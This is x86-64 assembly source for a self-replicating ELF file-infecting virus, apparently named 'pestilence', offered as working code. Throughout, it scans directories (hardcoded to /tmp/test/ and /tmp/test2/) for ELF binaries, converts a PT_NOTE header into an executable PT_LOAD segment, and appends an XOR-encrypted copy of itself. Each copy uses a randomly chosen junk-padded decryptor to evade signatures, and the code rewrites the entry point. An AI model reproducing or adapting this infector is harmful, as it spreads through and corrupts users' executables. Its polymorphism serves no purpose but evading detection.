%define DIR_FD               8
%define DIRENT_BUFF          (DIR_FD + 4096)
%define FILE_PATH            (DIRENT_BUFF + 4096)
%define FILE_FD              (FILE_PATH + 8)
%define MAPPED_PTR           (FILE_FD + 8)
%define STAT_STRUCT          (MAPPED_PTR + 144)
%define VIRUS_START          (STAT_STRUCT + 8)
%define VIRUS_END            (VIRUS_START + 8)
%define VIRUS_SIZE           (VIRUS_END + 8)
%define ORIGINAL_ENTRY_OFF   (VIRUS_SIZE + 8)
%define ALL_DECRYPTORS       (ORIGINAL_ENTRY_OFF + 56)
%define VIRUS_DECRYPTOR_ADDR (ALL_DECRYPTORS + 8)
%define VIRUS_ROUTINE_ADDR   (VIRUS_DECRYPTOR_ADDR + 8)
%define VIRUS_SIGNATURE_ADDR (VIRUS_ROUTINE_ADDR + 8)
%define NEW_KEY              (VIRUS_SIGNATURE_ADDR + 8)
%define FILE_SIZE            (NEW_KEY + 8)
%define VIRTUAL_ADDR         (FILE_SIZE + 8)
%define VIRUS_KEY_ADDR       (VIRTUAL_ADDR  + 8)
%define STRUCT_SIZE          (VIRUS_KEY_ADDR)

%define ROUTINE_SIZE         (_end - _start)
%define BUFF_SIZE            4096
%define ELF_MAGIC_NBR        0x00010102464c457f
%define DT_REG               8

%define SYS_OPEN             2
%define SYS_GETDENTS         78
%define SYS_MMAP             9
%define SYS_FSTAT            5
%define SYS_MUNMAP           11
%define SYS_CLOSE            3


; the variables used, defined on the stack

;    DIR_FD               : file descriptor of the opened direcroty
;    DIRENT_BUFF          : dirp, buffer to store directory entries
;    FILE_PATH            : path of a file in the directory to open
;    FILE_FD              : fd of the file
;    MAPPED_PTR           : pointer to the mapped binary to infect
;    STAT_STRUCT          : stat structure
;    VIRUS_START          : _start address
;    VIRUS_END            : _end address
;    VIRUS_SIZE           : _end - _start
;    ORIGINAL_ENTRY_OFF   : offset to the original entry, from where we inject the code.
;    ALL_DECRYPTORS       : buffer holding all 7 decryptors addr to chose one randomly.
;    VIRUS_DECRYPTOR_ADDR : decryptor address in pestilence.
;    VIRUS_ROUTINE_ADDR   : encrypted routine (stub) address.
;    VIRUS_SIGNATURE_ADDR : signature address in pestilence
;    NEW_KEY              : new key used for encryption
;    FILE_SIZE            : size of the binary to infect
;    VIRTUAL_ADDR         : v_addr where the pestilence, gonna get mapped
;    VIRUS_KEY_ADDR       : decryption key address in pestilence
;    STRUCT_SIZE          : size of all the variables to initialize the stack


section .text
global _start

_start:

;   rdi : _start of pestilence 
;   rsi : _end of pestilence 
;   rdx : offset to original entry, where the virus jump after finishing execution
;   rcx : address of decryptor (in the virus)
;   r8  : address where the encrypted routine is written
;   r10 : signature

    nop
    push    rbp
    mov     rbp, rsp
    sub     rbp, STRUCT_SIZE ; allocating space for vars structure

    ; setting the decryptors addresses, to chose one randomly
    lea     rax, [rel _decryptor_1] 
    mov     [rbp - ALL_DECRYPTORS], rax   
    lea     rax, [rel _decryptor_2]
    mov     [rbp - ALL_DECRYPTORS + 8], rax   
    lea     rax, [rel _decryptor_3]
    mov     [rbp - ALL_DECRYPTORS + 16], rax   
    lea     rax, [rel _decryptor_4]
    mov     [rbp - ALL_DECRYPTORS + 24], rax   
    lea     rax, [rel _decryptor_5]
    mov     [rbp - ALL_DECRYPTORS + 32], rax   
    lea     rax, [rel _decryptor_6]
    mov     [rbp - ALL_DECRYPTORS + 40], rax   
    lea     rax, [rel _decryptor_7]
    mov     [rbp - ALL_DECRYPTORS + 48], rax
    
    ; more stack vars init
    mov     [rbp - VIRUS_START], rdi 
    mov     [rbp - VIRUS_END], rsi
    mov     [rbp - ORIGINAL_ENTRY_OFF], rdx
    mov     [rbp - VIRUS_DECRYPTOR_ADDR], rcx
    mov     [rbp - VIRUS_ROUTINE_ADDR], r8
    mov     [rbp - VIRUS_SIGNATURE_ADDR], r10
    push    rsi
    sub     rsi, rdi
    mov     [rbp - VIRUS_SIZE], rsi
    pop     rsi
    sub     rsi, rbx
    mov     [rbp - VIRUS_KEY_ADDR], rsi

.parsing_label:
    lea     rdi, [rel infect_dir_1]
    call    _parsing
    lea     rdi, [rel infect_dir_2]
    call    _parsing

.quit:
    pop rbp 
    ret


_parsing:
; open the directory 
    mov     r15, rdi                    ; saving directory name pointer to use in _process_file
    mov     rax, SYS_OPEN
    xor     rsi, rsi                    ; O_RDONLY
    syscall
    test    rax, rax
    js      .return_parsing
    mov     [rbp - DIR_FD], rax

; read directory entries (getdents)
.read_directory:
    mov     rax,  SYS_GETDENTS
    lea     rdi, [rbp - DIR_FD]
    mov     rdi, [rdi]
    lea     rsi, [rbp - DIRENT_BUFF]
    mov     rdx,  BUFF_SIZE
    syscall
    test    rax, rax
    jle     .close_dir                   ; (error or no more entries)

    mov     r12, rax
    xor     r13, r13

.read_entry_files:
    cmp     r12, r13
    jle     .read_directory
    xor     r10, r10
    lea     rdi, [rbp - DIRENT_BUFF]
    add     rdi, r13
    movzx	r10, word [rdi + 16]        ; d_reclen
    mov     al,  byte [rdi + r10 - 1]   ; file type
    lea     rsi, [rdi  + 18]            ; address of d_name field
    add     r13, r10
    cmp     al,  DT_REG                 ; only process regular files
    jne     .read_entry_files
    push    r15                         ; saving directory name on stack
    call     _process_file
    xor     r15, r15
    pop     r15
    jmp     .read_entry_files

.close_dir:
    mov     rdi, [rbp - DIR_FD]
    mov     rax, SYS_CLOSE
    syscall

.return_parsing:
    ret

_process_file:
    mov     rdi, r15
    lea     rdx, [rbp - FILE_PATH]

; concating filename with directory name
.dirname:
    mov     al, byte [rdi]
    test    al, al
    jz      .filename
    mov     byte [rdx], al
    inc     rdi
    inc     rdx
    jmp     .dirname
    
.filename:
    mov     al, byte [rsi]
    test    al, al
    jz      .open_file
    mov     byte [rdx], al
    inc     rsi
    inc     rdx
    jmp     .dirname

.open_file:
    mov     byte [rdx], 0
    lea     rdi, [rbp - FILE_PATH]
    mov     rax, SYS_OPEN
    mov     rsi, 2
    syscall
    test     rax, rax
    js      .open_ret
    jmp     .get_file_size
.open_ret:
    ret

; get file size and mmap the file
.get_file_size:
    lea     r8,  [rbp - FILE_FD]
    mov     [r8], rax
    mov     rdi, rax         
    lea     rsi, [rbp - STAT_STRUCT]
    mov     rax, SYS_FSTAT           
    syscall 
    test    rax, rax
    js     .close_file

    mov     rsi, [rsi + 48]              ; file size 
    mov     [rbp - FILE_SIZE], rsi       ; storing file size
    add     rsi, 0xc000000               ; virtual address that will be used for the infection
    mov     [rbp - VIRTUAL_ADDR], rsi    ; storing the virtual address

; calling mmap
    mov     rsi, [rbp - FILE_SIZE]
    call    _mmap_func
    test     rax, rax
    js      .close_file
    
.check_valid_elf:

    lea     rbx, [rbp - MAPPED_PTR]
    mov     [rbx], rax                  ; saving mmap pointer

    mov     rbx, [rbx]
    mov     rdx, ELF_MAGIC_NBR          ; comparing magic number in header
    cmp     qword [rbx], rdx
    jne     .ummap_pointer

.check_infected:
    mov     rdi, [rbp - VIRUS_SIGNATURE_ADDR]
    mov     rsi, [rbp - VIRUS_END]
    sub     rsi, rdi ; to check

    mov     rax, [rbp - MAPPED_PTR]
    mov     r10, [rbp - FILE_SIZE]
    sub     r10, rsi
    add     rax, r10
    
    mov     rdi, [rdi]
    mov     rax, [rax]
    cmp     rdi, rax
    je      .ummap_pointer
    call    _infect_binary

.ummap_pointer:
    call     _unmmap_func

; closing fd
.close_file:
    mov     rdi, [rbp - FILE_FD]
    mov     rax, SYS_CLOSE
    syscall
    ret

_infect_binary:
    mov     r14, rbx
    mov	    r11, qword [rbx  + 0x18]    ; e_entry 
    movzx   rdx, word [rbx + 0x38]      ; e_phnum
    mov	    rcx, qword [rbx  + 0x20]    ; e_phoff
    add     rbx, rcx
    mov     rax, 0x4                    ; PT_NOTE

.segment:
    cmp     rdx, 0
    jle     .return_infect_binary
    cmp     al,  byte [rbx]
    jne     .next_segment
    jmp     .convert_to_PT_LOAD
    
.next_segment:
    dec     rdx
    add     rbx, 0x38                   ; size of elf64_phdr struct
    jmp     .segment

    
.convert_to_PT_LOAD:
    mov     r15, r14
    mov     r14, [rbp - MAPPED_PTR]
    sub     r15, r14 ; offset to new PT_LOAD 

    ; change to pt_load with PF_X PF_R flag
    mov     rax, 0x500000001           
    mov     [rbx], rax   

    xor     rax,rax
    mov     rax, [rbp - FILE_SIZE]
    mov     qword [rbx + 0x8], rax

    mov    rax, [rbp - VIRTUAL_ADDR]
    mov    qword [rbx + 0x10],rax

    mov    qword [rbx + 0x30],0x200000

    mov    rax, [rbp - VIRUS_SIZE]
    mov    qword [rbx + 0x20], rax
    mov    qword [rbx + 0x28], rax

    ; unmap the file 
    call    _unmmap_func

.increase_size:
    mov    rdi, [rbp - FILE_FD]
    mov    rax, 77
    mov    rsi, [rbp - FILE_SIZE]
    add    rsi, [rbp - VIRUS_SIZE]
    syscall
    test    rax, rax
    js      .return_infect_binary

.mmap_again:
    mov     rsi, [rbp - FILE_SIZE]         ; file size + virus size
    add     rsi, [rbp - VIRUS_SIZE]

    call    _mmap_func
    test     rax, rax
    js      .return_infect_binary
    mov     [rbp - MAPPED_PTR], rax

.inject_first_part:
    mov     rdi, [rbp - MAPPED_PTR]        ; Get mapping base
    add     rdi, [rbp - FILE_SIZE]

    mov     rsi, [rbp - VIRUS_START]
    mov     rax, [rbp - VIRUS_DECRYPTOR_ADDR]
    sub     rax, rsi
    mov     r8,  rax
    xor     rax, rax
    call    .copy_loop

.inject_second_part:
    rdtsc
    mov     rcx, 7
    xor     rdx, rdx
    div     rcx
    mov     rsi, [rbp - ALL_DECRYPTORS + rdx*8]
    mov     r8,  51
    xor     rax, rax
    call    .copy_loop


.inject_third_part:
    ; push    rbx
    lea     rcx, [rbp - NEW_KEY]
    lea     rbx, [rel key_pattern]
    xor     rsi,rsi
    call   _generate_key

    lea     rbx, [rbp - NEW_KEY]
    mov     r10, 8
    lea     rsi, [rel _start]
    xor     r8, r8
    call    .encrypt_body_copy

    mov     rax, [rbp - VIRUS_END] 
    mov     rsi, [rbp - VIRUS_ROUTINE_ADDR] 
    add     rsi, ROUTINE_SIZE 
    sub     rax, rsi
    mov     r8, rax
    xor     rax, rax
    call    .copy_loop
    jmp     .patch_binary

.copy_loop:
    movsb
    inc     rax
    cmp     rax, r8
    jne     .copy_loop
    ret

.encrypt_body_copy:
    mov     rax, r8
    xor     rdx, rdx
    div     r10
    movzx   rcx, byte [rsi]     
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    mov     byte [rdi], cl
    inc     rsi
    inc     rdi
    inc     r8
    cmp     r8, ROUTINE_SIZE 
    jne     .encrypt_body_copy
    ret

.patch_binary:
    mov     r14, [rbp - MAPPED_PTR]    
    mov     r11, qword [r14  + 0x18]     ; e_entry from header

    mov     rax, [rbp - VIRTUAL_ADDR]    ; calculating ORIGINAL_ENTRY_OFF value of pestilence.asm and patching it 
    sub     rax, r11                     ; the new value is the   virtual offset from beginning of routine (end of file) to e_entry
    mov     qword [rdi - 0x8], rax       ; ORIGINAL_ENTRY_OFF =  (FILE_SIZE or EOF + 0xc000000) - e_entry


; patching new key : 
    mov     r8, [rbp - NEW_KEY]
    mov     rax, [rbp - VIRUS_KEY_ADDR]
    sub     rdi, rax
    mov     qword [rdi], r8              ; offset to key in pestilence

; patching entry in header
    mov     rax, [rbp - VIRTUAL_ADDR]
    mov     qword [r14 + 0x18], rax


.return_infect_binary:
    ret

_generate_key:
    rdtsc
    mov     r8, 36
    xor     rdx, rdx
    div     r8
    xor     rax, rax
    mov     al,byte [rbx + rdx] ; key_pattern[i % 36]
    mov     byte [rcx], al
    inc     rcx
    inc     rsi
    cmp     rsi, 8
    jne     _generate_key
    ret

_decryptor_1:
    mov     rax, r11
    nop
    xor     rdx, rdx
    nop
    div     r10
    nop
    push    r11
    movzx   rcx, byte [rsi]     
    nop
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    mov     byte [rdi], cl
    nop
    inc     rsi
    nop
    inc     rdi
    pop     r11
    nop
    inc     r11
    cmp     r11, 0x615
    je      .return
    jmp     r12

.return:
    ret

_decryptor_2:
    mov     rax, r11
    xor     rdx, rdx
    nop
    div     r10
    nop
    movzx   rcx, byte [rsi]     
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    mov     byte [rdi], cl
    inc     rsi
    nop
    inc     rdi
    inc     r11
    xor     rax,rax
    shr     rax,3
    nop
    cmp     r11, 0x615
    je      .return
    jmp     r12
.return:
    ret

_decryptor_3:
    mov     rax, r11
    xor     rdx, rdx
    div     r10
    movzx   rcx, byte [rsi]     
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    mov     byte [rdi], cl
    mov     r13, rsi
    xor     r13, rdi
    inc     rsi
    inc     rdi
    nop
    inc     r11
    shl     rax, 3
    cmp     r11, 0x615
    je      .return
    jmp     r12
.return:
    ret

_decryptor_4:
    mov     rax, r11
    xor     rdx, rdx
    nop
    div     r10
    movzx   rcx, byte [rsi]  
    push    r10
    pop     r10   
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    mov     byte [rdi], cl
    inc     rsi
    xor     rax,rax
    nop
    inc     rdi
    inc     r11
    nop
    cmp     r11, 0x615
    je      .return
    nop
    jmp     r12
.return:
    ret

_decryptor_5:
    mov     rax, r11
    xor     rdx, rdx
    div     r10
    movzx   rcx, byte [rsi]
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    nop
    mov     byte [rdi], cl
    rol     rcx, 4
    ror     rcx, 5
    inc     rsi
    inc     rdi
    nop
    inc     r11
    nop
    cmp     r11, 0x615
    je      .return
    jmp     r12
.return:
    ret

_decryptor_6:
    mov     rax, r11
    xor     rdx, rdx
    div     r10
    movzx   rcx, byte [rsi]     
    mov     rax, rax
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    mov     byte [rdi], cl
    inc     rsi
    inc     rdi
    ror     rax, 6
    inc     r11
    rol     rax, 6
    cmp     r11, 0x615
    je      .return
    jmp     r12
.return:
    ret

_decryptor_7:
    mov     rax, r11
    nop
    xor     rdx, rdx
    div     r10
    movzx   rcx, byte [rsi]     
    nop
    xor     cl, byte [rbx + rdx ] ; key[i % 8)]
    inc     rax
    nop
    mov     byte [rdi], cl
    inc     rsi
    ror     rax, 2
    inc     rdi
    inc     r11
    nop
    cmp     r11, 0x615
    je      .return
    jmp     r12
.return:
    ret

_mmap_func:
    ;   params :
    ;   rsi     total size of file
    mov     rdi,  0                     ; addr (NULL -> kernel chooses address)
    mov     rdx,  0x1 | 0x2             ; PROT_READ | PROT_WRITE
    mov     r10,  0x1                   ; MAP_SHARED
    mov     r8,  [rbp - FILE_FD]        ; fd
    xor     r9,  r9                     ; offset (start of file)
    xor     rcx, rcx
    mov     rax, SYS_MMAP
    syscall
    ret

_unmmap_func:
    mov     rdi, [rbp - MAPPED_PTR]
    lea     rsi, [rbp - STAT_STRUCT]
    mov     rsi, [rsi + 0x40]           ; file size
    mov     rax, SYS_MUNMAP
    syscall
    ret

infect_dir_1    db  "/tmp/test/", 0
infect_dir_2    db  "/tmp/test2/", 0
key_pattern     db   "abcdefjhijklmnopqrstuvwxyz0123456789"

_end:
